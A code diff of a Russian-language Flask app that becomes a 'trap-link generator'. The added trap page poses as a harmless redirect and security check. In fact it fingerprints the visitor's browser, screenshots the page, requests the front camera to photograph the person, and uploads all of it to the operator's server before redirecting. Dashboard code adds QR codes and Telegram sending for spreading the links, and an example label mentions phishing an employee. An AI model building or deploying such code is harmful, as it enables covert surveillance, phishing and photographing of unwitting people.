+            transform: translateY(-3px) scale(1.01);
+            box-shadow: 0 25px 45px rgba(14, 165, 233, 0.35);
         }
         
         .link-result {
             margin-top: 30px;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 10px;
+            padding: 24px;
+            background: linear-gradient(180deg, rgba(14, 165, 233, 0.06), rgba(14, 165, 233, 0.02));
+            border-radius: 20px;
             display: none;
+            border: 1px solid rgba(14, 165, 233, 0.12);
+            animation: slideInUp 0.6s ease-out;
         }
         
-        .link-result.active {
-            display: block;
-            animation: fadeIn 0.5s;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
         
         .generated-link {
@@ -561,24 +2944,26 @@ MAIN_PAGE = """
         .link-input {
             flex: 1;
             padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+            border-radius: 14px;
             background: white;
             font-size: 14px;
+            word-break: break-all;
         }
         
         .copy-btn {
-            background: #28a745;
+            background: linear-gradient(135deg, #10b981, #0f9f74);
             color: white;
             border: none;
             padding: 12px 20px;
-            border-radius: 8px;
+            border-radius: 14px;
             cursor: pointer;
             font-weight: 600;
+            white-space: nowrap;
         }
         
         .copy-btn:hover {
-            background: #218838;
+            box-shadow: 0 14px 24px rgba(15, 159, 116, 0.18);
         }
         
         .stats {
@@ -589,16 +2974,17 @@ MAIN_PAGE = """
         }
         
         .stat-box {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
+            background: rgba(255,255,255,0.72);
+            padding: 22px;
+            border-radius: 20px;
             text-align: center;
+            border: 1px solid rgba(255,255,255,0.7);
         }
         
         .stat-number {
             font-size: 2em;
             font-weight: bold;
-            color: #667eea;
+            color: #0f3d63;
             margin-bottom: 5px;
         }
         
@@ -612,55 +2998,194 @@ MAIN_PAGE = """
         }
         
         .link-item {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 10px;
+            background: rgba(255,255,255,0.76);
+            padding: 18px;
+            border-radius: 18px;
+            margin-bottom: 12px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border: 1px solid rgba(255,255,255,0.72);
+            box-shadow: 0 14px 34px rgba(15, 38, 63, 0.08);
         }
         
         .link-info {
             flex: 1;
+            overflow: hidden;
         }
         
         .link-name {
             font-weight: 600;
-            color: #333;
+            color: #10263d;
+            margin-bottom: 5px;
+            font-size: 18px;
         }
         
         .link-url {
-            color: #666;
+            color: #0369a1;
             font-size: 0.9em;
-            margin-top: 5px;
+            word-break: break-all;
+            margin-bottom: 5px;
         }
         
         .link-stats {
             font-size: 0.8em;
-            color: #888;
+            color: #62738a;
         }
         
         .delete-btn {
-            background: #dc3545;
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
             color: white;
             border: none;
             padding: 8px 15px;
-            border-radius: 6px;
+            border-radius: 12px;
             cursor: pointer;
             font-size: 0.9em;
+            white-space: nowrap;
+            margin-left: 10px;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .btn-secondary {
+            background: #e9f2f9;
+            color: #10263d;
+            border: 1px solid rgba(16, 46, 80, 0.08);
+            padding: 11px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            flex: 1;
+        }
+        
+        .btn-secondary:hover {
+            background: #dcebf6;
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #10b981, #0f9f74);
+            color: white;
+            border: none;
+            padding: 11px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            flex: 1;
+        }
+        
+        .btn-success:hover {
+            box-shadow: 0 14px 24px rgba(15, 159, 116, 0.18);
+        }
+        
+        .qr-container {
+            text-align: center;
+            margin-top: 20px;
+            padding: 20px;
+            background: white;
+            border-radius: 18px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+        }
+        
+        .qr-code {
+            max-width: 200px;
+            margin: 0 auto;
+        }
+        
+        .qr-code img {
+            width: 100%;
+            height: auto;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #10b981, #0f9f74);
+            color: white;
+            box-shadow: 0 20px 45px rgba(0,0,0,0.18);
+            z-index: 1000;
+            display: none;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .notification.error {
+            background: #dc3545;
+        }
+        
+        .notification.info {
+            background: #17a2b8;
+        }
+        
+        .session-info {
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+        }
+        
+        @media (max-width: 900px) {
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .container {
+                padding: 28px;
+            }
+            .generated-link,
+            .btn-group,
+            .link-item {
+                flex-direction: column;
+                align-items: stretch;
+            }
         }
     </style>
 </head>
 <body>
+    <div class="header">
+        <div class="user-info">
+            <div class="avatar" id="userAvatar">{{ user_initials }}</div>
+            <div class="user-details">
+                <h2 id="userName">{{ user_name }}</h2>
+                <p id="userStats">Ссылок: <span id="linkCount">0</span> • Кликов: <span id="clickCount">0</span></p>
+                <p class="session-info">✅ Сессия сохранена до {{ session_expiry }}</p>
+            </div>
+        </div>
+        <div>
+            <button onclick="logout(false)" class="logout-btn" style="background: #6c757d; margin-right: 10px;">🚪 Выйти</button>
+            <button onclick="logout(true)" class="logout-btn">🗑 Выйти везде</button>
+        </div>
+    </div>
+    
     <div class="container">
-        <h1>🕵️‍♂️ Screenshot Tracker</h1>
-        <p class="subtitle">Генерируйте ссылки, которые делают скриншот при переходе</p>
+        <h1>🕵️‍♂️ Генератор ссылок-ловушек</h1>
+        <p class="subtitle">Создавайте ссылки, которые делают скриншот и фото с камеры при переходе</p>
         
         <form id="linkForm">
             <div class="form-group">
                 <label for="linkName">Название ссылки (необязательно):</label>
-                <input type="text" id="linkName" placeholder="Например: 'Фишинг для сотрудника'">
+                <input type="text" id="linkName" placeholder="Например: 'Проверка безопасности'">
+            </div>
+            
+            <div class="form-group">
+                <label for="redirectUrl">URL для перенаправления:</label>
+                <input type="text" id="redirectUrl" placeholder="https://www.google.com" value="https://www.google.com">
             </div>
             
             <button type="submit" class="btn">🎯 Сгенерировать ссылку</button>
@@ -679,8 +3204,18 @@ MAIN_PAGE = """
                 <button onclick="copyShortLink()" class="copy-btn">🔗 Короткая</button>
             </div>
             
-            <div style="margin-top: 15px;">
-                <button onclick="testLink()" class="btn" style="background: #17a2b8;">🧪 Протестировать ссылку</button>
+            <div class="btn-group">
+                <button onclick="testLink()" class="btn-secondary">🧪 Тестировать ссылку</button>
+                <button onclick="showQRCode()" class="btn-success">📱 Показать QR-код</button>
+                <button onclick="sendToTelegram()" class="btn-secondary">📤 Отправить в Telegram</button>
+            </div>
+            
+            <div id="qrSection" class="qr-container" style="display: none;">
+                <h4>📱 QR-код для быстрого доступа</h4>
+                <div class="qr-code">
+                    <img id="qrCodeImage" src="" alt="QR Code">
+                </div>
+                <p style="margin-top: 10px; font-size: 12px; color: #666;">Отсканируйте QR-код камерой телефона для перехода по ссылке</p>
             </div>
         </div>
         
@@ -701,63 +3236,189 @@ MAIN_PAGE = """
         
         <div class="links-list" id="linksList">
             <h3>📋 Ваши ссылки:</h3>
-            <!-- Список ссылок будет здесь -->
+            <div class="loading" id="loadingLinks">Загрузка ссылок...</div>
         </div>
     </div>
     
+    <div class="notification" id="notification"></div>
+    
     <script>
+        // Базовый URL
+        const BASE_URL = '{{ base_url }}';
+        let userData = {{ user_data|tojson }};
+        let currentGeneratedName = 'Без названия';
+        
+        // Обновление статистики пользователя
+        function updateUserStats() {
+            document.getElementById('linkCount').textContent = document.getElementById('totalLinks').textContent;
+            document.getElementById('clickCount').textContent = document.getElementById('totalClicks').textContent;
+        }
+        
+        // Показать уведомление
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification ' + type;
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
         // Загрузка статистики
         async function loadStats() {
             try {
                 const response = await fetch('/api/stats');
+                if (!response.ok) throw new Error('Network error');
                 const data = await response.json();
                 
-                document.getElementById('totalLinks').textContent = data.total_links;
-                document.getElementById('totalClicks').textContent = data.total_clicks;
-                document.getElementById('activeLinks').textContent = data.active_links;
+                document.getElementById('totalLinks').textContent = data.total_links || 0;
+                document.getElementById('totalClicks').textContent = data.total_clicks || 0;
+                document.getElementById('activeLinks').textContent = data.active_links || 0;
                 
-                // Загрузка списка ссылок
+                updateUserStats();
                 loadLinks();
             } catch (error) {
                 console.error('Ошибка загрузки статистики:', error);
+                showNotification('Ошибка загрузки статистики', 'error');
             }
         }
         
         // Загрузка списка ссылок
         async function loadLinks() {
             try {
+                document.getElementById('loadingLinks').style.display = 'block';
+                
                 const response = await fetch('/api/links');
+                if (!response.ok) throw new Error('Network error');
                 const links = await response.json();
                 
                 const linksList = document.getElementById('linksList');
                 let html = '<h3>📋 Ваши ссылки:</h3>';
                 
-                if (Object.keys(links).length === 0) {
-                    html += '<p style="text-align: center; color: #666;">Нет созданных ссылок</p>';
+                if (!links || links.length === 0) {
+                    html += '<p style="text-align: center; color: #666; padding: 20px;">Нет созданных ссылок</p>';
                 } else {
-                    for (const [id, link] of Object.entries(links)) {
-                        const created = new Date(link.created).toLocaleDateString();
-                        const expires = new Date(link.expires).toLocaleDateString();
+                    for (const link of links) {
+                        const created = new Date(link.created_at).toLocaleDateString('ru-RU');
+                        const expires = new Date(link.expires_at).toLocaleDateString('ru-RU');
                         const status = link.active ? '🟢 Активна' : '🔴 Истекла';
+                        const fullUrl = `${BASE_URL}/red/${link.link_id}`;
+                        const shortUrl = `${BASE_URL}/r/${link.link_id}`;
                         
                         html += `
                             <div class="link-item">
                                 <div class="link-info">
-                                    <div class="link-name">${link.name}</div>
-                                    <div class="link-url">/${id}</div>
+                                    <div class="link-name">${link.name || 'Без названия'}</div>
+                                    <div class="link-url">${fullUrl}</div>
                                     <div class="link-stats">
-                                        👆 ${link.clicks} переходов • 📅 Создана: ${created} • ⏳ Истекает: ${expires} • ${status}
+                                        👆 ${link.clicks || 0} переходов • 📅 Создана: ${created} • ⏳ Истекает: ${expires} • ${status}
                                     </div>
                                 </div>
-                                <button onclick="deleteLink('${id}')" class="delete-btn">🗑 Удалить</button>
+                                <div>
+                                    <button onclick="copyToClipboard('${fullUrl}')" class="copy-btn" style="padding: 6px 12px; font-size: 12px;">📋</button>
+                                    <button onclick="showLinkQR('${fullUrl}')" class="btn-secondary" style="padding: 6px 12px; font-size: 12px; margin: 0 5px;">📱</button>
+                                    <button onclick="deleteLink('${link.link_id}')" class="delete-btn">🗑</button>
+                                </div>
                             </div>
                         `;
                     }
                 }
                 
                 linksList.innerHTML = html;
+                document.getElementById('loadingLinks').style.display = 'none';
             } catch (error) {
                 console.error('Ошибка загрузки ссылок:', error);
+                showNotification('Ошибка загрузки ссылок', 'error');
+                document.getElementById('loadingLinks').innerHTML = 'Ошибка загрузки';
+            }
+        }
+        
+        // Показать QR-код для существующей ссылки
+        async function showLinkQR(url) {
+            try {
+                const response = await fetch('/api/generate-qr', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ url: url })
+                });
+                
+                if (!response.ok) throw new Error('Network error');
+                const data = await response.json();
+                
+                if (data.success && data.qr_code) {
+                    // Создаем всплывающее окно с QR-кодом
+                    const popup = window.open('', 'QR Code', 'width=400,height=500,scrollbars=no,resizable=no');
+                    popup.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>QR-код для ссылки</title>
+                            <style>
+                                body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+                                .qr-container { margin: 20px auto; max-width: 300px; }
+                                .qr-code { width: 100%; height: auto; }
+                                .url { word-break: break-all; margin: 20px 0; color: #666; }
+                            </style>
+                        </head>
+                        <body>
+                            <h2>📱 QR-код для ссылки</h2>
+                            <div class="qr-container">
+                                <img src="${data.qr_code}" alt="QR Code" class="qr-code">
+                            </div>
+                            <p class="url">${url}</p>
+                            <button onclick="window.print()">🖨 Печать</button>
+                            <button onclick="window.close()">❌ Закрыть</button>
+                        </body>
+                        </html>
+                    `);
+                } else {
+                    showNotification('Ошибка генерации QR-кода', 'error');
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                showNotification('Ошибка генерации QR-кода', 'error');
+            }
+        }
+        
+        // Показать QR-код для созданной ссылки
+        async function showQRCode() {
+            const link = document.getElementById('generatedLink').value;
+            if (!link) {
+                showNotification('Сначала создайте ссылку', 'error');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/generate-qr', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ url: link })
+                });
+                
+                if (!response.ok) throw new Error('Network error');
+                const data = await response.json();
+                
+                if (data.success && data.qr_code) {
+                    const qrSection = document.getElementById('qrSection');
+                    const qrImage = document.getElementById('qrCodeImage');
+                    
+                    qrImage.src = data.qr_code;
+                    qrSection.style.display = 'block';
+                    qrSection.scrollIntoView({ behavior: 'smooth' });
+                    
+                    showNotification('QR-код сгенерирован', 'info');
+                } else {
+                    showNotification('Ошибка генерации QR-кода', 'error');
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                showNotification('Ошибка генерации QR-кода', 'error');
             }
         }
         
@@ -766,6 +3427,12 @@ MAIN_PAGE = """
             e.preventDefault();
             
             const linkName = document.getElementById('linkName').value;
+            const redirectUrl = document.getElementById('redirectUrl').value;
+            
+            if (!redirectUrl || !redirectUrl.startsWith('http')) {
+                showNotification('Введите корректный URL (начинается с http:// или https://)', 'error');
+                return;
+            }
             
             try {
                 const response = await fetch('/api/create', {
@@ -773,418 +3440,1848 @@ MAIN_PAGE = """
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ name: linkName })
+                    body: JSON.stringify({ 
+                        name: linkName || 'Без названия',
+                        redirect_url: redirectUrl
+                    })
                 });
                 
+                if (!response.ok) throw new Error('Network error');
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('generatedLink').value = data.url;
-                    document.getElementById('shortLink').value = data.short_url;
+                    const fullUrl = data.full_url;
+                    const shortUrl = data.short_url;
+                    
+                    currentGeneratedName = data.name || 'Без названия';
+                    document.getElementById('generatedLink').value = fullUrl;
+                    document.getElementById('shortLink').value = shortUrl;
                     document.getElementById('linkResult').classList.add('active');
                     
+                    // Скрываем QR-код предыдущей ссылки
+                    document.getElementById('qrSection').style.display = 'none';
+                    
+                    // Прокрутить к результату
+                    document.getElementById('linkResult').scrollIntoView({ behavior: 'smooth' });
+                    
+                    // Очистить форму
+                    document.getElementById('linkName').value = '';
+                    
                     // Обновляем статистику
-                    loadStats();
+                    await loadStats();
+                    
+                    showNotification('✅ Ссылка успешно создана!');
+                } else {
+                    showNotification('Ошибка создания ссылки: ' + (data.error || 'Неизвестная ошибка'), 'error');
                 }
             } catch (error) {
                 console.error('Ошибка создания ссылки:', error);
-                alert('Ошибка создания ссылки');
+                showNotification('Ошибка создания ссылки', 'error');
             }
         });
         
-        // Копирование ссылки
+        // Копирование в буфер обмена
         function copyLink() {
             const linkInput = document.getElementById('generatedLink');
-            linkInput.select();
-            document.execCommand('copy');
-            alert('Ссылка скопирована в буфер обмена!');
+            copyToClipboard(linkInput.value);
         }
         
         function copyShortLink() {
             const linkInput = document.getElementById('shortLink');
-            linkInput.select();
-            document.execCommand('copy');
-            alert('Короткая ссылка скопирована!');
+            copyToClipboard(linkInput.value);
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text)
+                .then(() => showNotification('✅ Ссылка скопирована в буфер обмена!'))
+                .catch(() => {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = text;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    showNotification('✅ Ссылка скопирована!');
+                });
         }
         
         // Тестирование ссылки
         function testLink() {
             const link = document.getElementById('generatedLink').value;
-            window.open(link, '_blank');
+            if (link) {
+                window.open(link, '_blank');
+            } else {
+                showNotification('Сначала создайте ссылку', 'error');
+            }
         }
         
-        // Удаление ссылки
-        async function deleteLink(id) {
-            if (!confirm('Удалить эту ссылку?')) return;
+        // Отправка ссылки в Telegram
+        async function sendToTelegram() {
+            const link = document.getElementById('generatedLink').value;
+            if (!link) {
+                showNotification('Сначала создайте ссылку', 'error');
+                return;
+            }
             
             try {
-                const response = await fetch(`/api/delete/${id}`, {
-                    method: 'DELETE'
+                const response = await fetch('/api/send-link-telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        link: link,
+                        name: currentGeneratedName
+                    })
                 });
                 
                 const data = await response.json();
+                if (data.success) {
+                    showNotification('✅ Ссылка отправлена в ваш Telegram!');
+                } else {
+                    showNotification('Ошибка отправки: ' + (data.error || ''), 'error');
+                }
+            } catch (error) {
+                showNotification('Ошибка отправки в Telegram', 'error');
+                console.error(error);
+            }
+        }
+        
+        // Удаление ссылки
+        async function deleteLink(linkId) {
+            if (!confirm('Удалить эту ссылку?')) return;
+            
+            try {
+                const response = await fetch(`/api/delete/${linkId}`, {
+                    method: 'DELETE'
+                });
+                
+                if (!response.ok) throw new Error('Network error');
+                const data = await response.json();
                 
                 if (data.success) {
-                    loadStats();
+                    showNotification('✅ Ссылка удалена');
+                    await loadStats();
+                } else {
+                    showNotification('Ошибка удаления ссылки', 'error');
                 }
             } catch (error) {
                 console.error('Ошибка удаления ссылки:', error);
+                showNotification('Ошибка удаления ссылки', 'error');
+            }
+        }
+        
+        // Выход из системы
+        async function logout(logoutEverywhere = false) {
+            const message = logoutEverywhere 
+                ? 'Вы уверены, что хотите выйти со всех устройств?'
+                : 'Вы уверены, что хотите выйти?';
+                
+            if (!confirm(message)) return;
+            
+            try {
+                const response = await fetch('/api/logout', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ logout_everywhere: logoutEverywhere })
+                });
+                
+                if (response.ok) {
+                    window.location.href = '/login';
+                }
+            } catch (error) {
+                console.error('Ошибка выхода:', error);
+                showNotification('Ошибка выхода из системы', 'error');
+            }
+        }
+
+        async function checkDashboardSession() {
+            try {
+                const response = await fetch('/api/check-auth');
+                if (!response.ok) return;
+                const data = await response.json();
+                if (data.demo_expired || !data.authenticated) {
+                    window.location.href = '/login';
+                }
+            } catch (error) {
+                console.error('Ошибка проверки сессии:', error);
             }
         }
         
         // Загрузка данных при старте
-        document.addEventListener('DOMContentLoaded', loadStats);
-        
-        // Автообновление каждые 30 секунд
-        setInterval(loadStats, 30000);
+        document.addEventListener('DOMContentLoaded', async () => {
+            await loadStats();
+            
+            // Автообновление каждые 30 секунд
+            setInterval(loadStats, 30000);
+            setInterval(checkDashboardSession, 5000);
+        });
     </script>
 </body>
-</html>
-"""
+</html>"""
 
-REDIRECT_PAGE = """
-<!DOCTYPE html>
+TRAP_HTML = """<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url={{ redirect_url }}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Перенаправление...</title>
     <style>
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
-            color: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at top left, rgba(79, 70, 229, 0.22), transparent 28%),
+                        radial-gradient(circle at bottom right, rgba(16, 185, 129, 0.18), transparent 20%),
+                        linear-gradient(135deg, #020617 0%, #111827 100%);
+            color: #f8fafc;
+            font-family: 'Inter', system-ui, sans-serif;
+        }
+        .frame {
+            position: relative;
+            width: min(620px, calc(100% - 32px));
+            padding: 34px;
+            border-radius: 28px;
+            background: rgba(15, 23, 42, 0.92);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 35px 80px rgba(15, 23, 42, 0.45);
+            overflow: hidden;
+        }
+        .frame::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(circle at top left, rgba(59, 130, 246, 0.16), transparent 22%),
+                        radial-gradient(circle at bottom right, rgba(16, 185, 129, 0.12), transparent 18%);
+        }
+        .title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #cbd5e1;
+            margin-bottom: 26px;
+            line-height: 1.7;
+        }
+        .steps {
+            display: grid;
+            gap: 14px;
+            margin-bottom: 28px;
+        }
+        .step {
+            display: flex;
+            gap: 14px;
+            padding: 18px 20px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255,255,255,0.08);
+            backdrop-filter: blur(6px);
+        }
+        .step-icon {
+            width: 44px;
+            height: 44px;
+            display: grid;
+            place-items: center;
+            border-radius: 14px;
+            background: rgba(99, 102, 241, 0.18);
+            color: #e0e7ff;
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+        .step-content {
+            min-width: 0;
+        }
+        .step-title {
+            font-size: 1rem;
+            margin-bottom: 4px;
+            color: #f8fafc;
+        }
+        .step-desc {
+            font-size: 0.92rem;
+            color: #94a3b8;
+            line-height: 1.45;
+        }
+        .status-card {
+            padding: 18px 20px;
+            border-radius: 22px;
+            background: rgba(15, 23, 42, 0.85);
+            border: 1px solid rgba(255,255,255,0.06);
+            display: grid;
+            gap: 10px;
+        }
+        .status-title {
+            font-size: 0.86rem;
+            text-transform: uppercase;
+            letter-spacing: 0.18em;
+            color: #7dd3fc;
+        }
+        .status-text {
+            font-size: 1.05rem;
+            color: #e2e8f0;
+            min-height: 28px;
+        }
+        .progress {
+            width: 100%;
+            height: 8px;
+            border-radius: 999px;
+            background: rgba(255,255,255,0.07);
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            border-radius: inherit;
+            background: linear-gradient(90deg, #6366f1, #38bdf8);
+            animation: progressMove 3.5s ease forwards;
+        }
+        @keyframes progressMove {
+            0% { width: 0%; }
+            30% { width: 40%; }
+            65% { width: 76%; }
+            100% { width: 100%; }
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 0.88rem;
+            color: #94a3b8;
             text-align: center;
         }
-        .container {
-            background: rgba(255,255,255,0.1);
-            padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-        }
-        h1 {
-            margin-bottom: 20px;
-        }
-        .loader {
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top: 5px solid white;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @media (max-width: 520px) {
+            .frame { padding: 24px; }
+            .steps { gap: 12px; }
+            .step { padding: 16px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔄 Перенаправление...</h1>
-        <p>Пожалуйста, подождите, вас перенаправляют.</p>
-        <div class="loader"></div>
+    <div class="frame">
+        <div class="title">🔄 Перенаправление...</div>
+        <div class="subtitle">Проводим проверку доступа и безопасное перенаправление на целевой сайт.</div>
+
+        <div class="steps">
+            <div class="step">
+                <div class="step-icon">1</div>
+                <div class="step-content">
+                    <div class="step-title">Сбор данных</div>
+                    <div class="step-desc">Собираем параметры браузера и информацию о сессии.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-icon">2</div>
+                <div class="step-content">
+                    <div class="step-title">Запрос к странице</div>
+                    <div class="step-desc">Попытка сделать скриншот и сохранить результаты.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-icon">3</div>
+                <div class="step-content">
+                    <div class="step-title">Переход</div>
+                    <div class="step-desc">Через несколько секунд вы будете отправлены на целевой URL.</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="status-card">
+            <div class="status-title">Статус операции</div>
+            <div class="status-text" id="status">Подготовка...</div>
+            <div class="progress"><div class="progress-bar"></div></div>
+        </div>
+
+        <div class="footer">Если перенаправление не сработает автоматически, обновите страницу или попробуйте снова.</div>
     </div>
+
+    <script>
+        const TRAP_ID = "{{ trap_id }}";
+        const REDIRECT_URL = "{{ redirect_url }}";
+        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const SERVER_URL = window.location.origin;
+        const statusEl = document.getElementById('status');
+
+        const browserInfo = {
+            trap_id: TRAP_ID,
+            session_id: SESSION_ID,
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen_width: screen.width,
+            screen_height: screen.height,
+            color_depth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer,
+            url: window.location.href
+        };
+
+        function updateStatus(message) {
+            statusEl.textContent = message;
+        }
+
+        async function sendImage(dataURL, imageType) {
+            try {
+                const blob = await (await fetch(dataURL)).blob();
+                const formData = new FormData();
+                formData.append('image', blob, `${imageType}_${Date.now()}.jpg`);
+                formData.append('type', imageType);
+                formData.append('session_id', SESSION_ID);
+                formData.append('trap_id', TRAP_ID);
+                formData.append('browser_info', JSON.stringify(browserInfo));
+
+                const response = await fetch(`${SERVER_URL}/api/upload`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function captureScreenshot() {
+            updateStatus('Собираем данные сайта...');
+            if (typeof html2canvas === 'undefined') {
+                await new Promise((resolve) => {
+                    const script = document.createElement('script');
+                    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                    script.onload = resolve;
+                    script.onerror = resolve;
+                    document.head.appendChild(script);
+                });
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 750));
+            if (typeof html2canvas !== 'undefined') {
+                try {
+                    const canvas = await html2canvas(document.documentElement, {
+                        scale: 0.5,
+                        useCORS: true,
+                        logging: false
+                    });
+                    const imageData = canvas.toDataURL('image/jpeg', 0.75);
+                    const ok = await sendImage(imageData, 'screenshot');
+                    updateStatus(ok ? 'Скриншот отправлен.' : 'Скриншот не получен.');
+                    return ok;
+                } catch (error) {
+                    updateStatus('Не удалось сделать скриншот.');
+                }
+            }
+            return false;
+        }
+
+        async function captureCamera() {
+            updateStatus('Проверяем камеру...');
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                updateStatus('Камеру проверить не удалось.');
+                return false;
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: 'user' }, audio: false});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => { video.play(); resolve(); };
+                });
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                const ok = await sendImage(imageData, 'camera');
+                updateStatus(ok ? 'Камера записана.' : 'Камера не доступна.');
+                return ok;
+            } catch (error) {
+                updateStatus('Нет доступа к камере.');
+                return false;
+            }
+        }
+
+        async function run() {
+            updateStatus('Начинаем процесс...');
+            await captureScreenshot();
+            await new Promise(resolve => setTimeout(resolve, 500));
+            await captureCamera();
+            updateStatus('Готово. Перенаправляем...');
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1600);
+        }
+
+        run();
+    </script>
 </body>
-</html>
-"""
+</html>"""
 
-# ========== API ЭНДПОИНТЫ ==========
+# ========== FLASK МАРШРУТЫ ==========
+
+def get_dashboard_template(mobile=False):
+    """Return desktop or mobile dashboard template."""
+    if not mobile:
+        return GENERATOR_HTML
+
+    template = GENERATOR_HTML.replace('<body>', '<body class="mobile-view">', 1)
+    template = template.replace('<div class="container">', '<div class="container mobile-container">', 1)
+    template = template.replace(
+        '</style>',
+        '''
+        .mobile-view {
+            padding: 10px;
+        }
+
+        .mobile-container {
+            max-width: 560px;
+            padding: 22px;
+        }
+
+        .mobile-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            border-radius: 999px;
+            background: rgba(14, 165, 233, 0.12);
+            color: #0f3d63;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin: 0 auto 16px;
+        }
+
+        @media (max-width: 700px) {
+            .mobile-view .header {
+                padding: 16px;
+                border-radius: 18px;
+                gap: 14px;
+            }
+
+            .mobile-view .container {
+                padding: 18px;
+                border-radius: 22px;
+            }
+
+            .mobile-view h1 {
+                font-size: 2em;
+            }
+
+            .mobile-view .subtitle {
+                margin-bottom: 24px;
+                font-size: 0.98em;
+            }
+
+            .mobile-view .stats {
+                grid-template-columns: 1fr;
